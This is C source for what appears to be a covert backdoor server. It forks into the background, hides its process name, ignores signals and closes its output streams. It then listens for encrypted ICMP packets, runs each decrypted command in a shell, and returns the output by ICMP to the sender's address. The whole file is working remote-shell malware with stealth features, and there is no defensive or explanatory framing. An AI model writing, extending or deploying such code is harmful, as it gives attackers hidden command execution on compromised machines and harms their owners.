#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include "libicmp.h"
#include "sneak.h"

char *realip;

int
main (int argc, char *argv[])
{

  char emsg[BUFSIZ + MAXMESG];
  char inbuf[128];
  char sbuf[4069];
  char *msg = NULL;
  char *muf = NULL;
  char *ukey = NULL;
  char *chtmp = NULL;
  char *retip = NULL;
  FILE *stream;
  int sigcount = 0;

  ukey = key ();

  if ((fork ()) != 0)
    exit (0);

  edumask (argc, argv);

fclose(stdout);	
fclose(stderr); 

  if ((msg = (char *) malloc (BUFSIZ + MAXMESG)) == NULL)
    {
      perror ("malloc()");
      exit (1);
    }

  for (sigcount = 0; sigcount < SIGMAX; ++sigcount)	/* Sigs suck */
    signal (sigcount, SIG_IGN);

  signal (SIGCHLD, SIG_DFL);

  ICMP_init ();

  while (1)
    {				/* Main loop */

      bzero (emsg, BUFSIZ + MAXMESG);
      bzero (sbuf, 4069);
      msg = NULL;

      if ((ICMP_recv (emsg, MAXMESG, 0)) == -666)
	{
	  perror ("Icmp_recv()");
	  exit (1);
	}

      muf = crypt (emsg, ukey, DECRYPT);
      retip = strtok (muf, ":");
      msg = strtok (NULL, ":");

      /* Close client and server */

      if ((strncmp (msg, CLOSE, strlen (CLOSE))) == 0)
	break;

      /* change directory */

      else if ((strncmp (msg, CD, strlen (CD))) == 0)
	{

	  chtmp = strtok (msg, " ");
	  chtmp = strtok (NULL, " ");
	  chdir (strtok (chtmp, "\n"));

	  snprintf (sbuf, sizeof (sbuf), "Changed to %s\n", chtmp);

	  if ((ICMP_sp_send
	       (crypt (sbuf, ukey, ENCRYPT), 0, inet_addr (retip), 1,
		0)) == -1)
	    {
	      perror ("sendto()");
	      exit (1);
	    }
	}			/* end of cd */

      /* Bash command */
      else
	{
	  if (strlen (msg) > 1)
	    {
	      if ((stream = popen (msg, "r")) != NULL)
		{
	          bzero (sbuf, sizeof (sbuf));

	          while ((fgets (inbuf, sizeof (inbuf), stream)) != NULL)
		   {
		    strcat (sbuf, inbuf);
		    bzero (inbuf, 128);
	       	   }

	          if ((pclose (stream)) != -1)
		    {

	             if ((ICMP_sp_send
		     (crypt (sbuf, ukey, ENCRYPT), 0, inet_addr (retip), 1,
		      0)) != -1)
			;
                     }
                   }

	    }			/* End of strlen */
	}			/* End of else */
    }				/* End of while */

  ICMP_reset ();
  return 0;
}
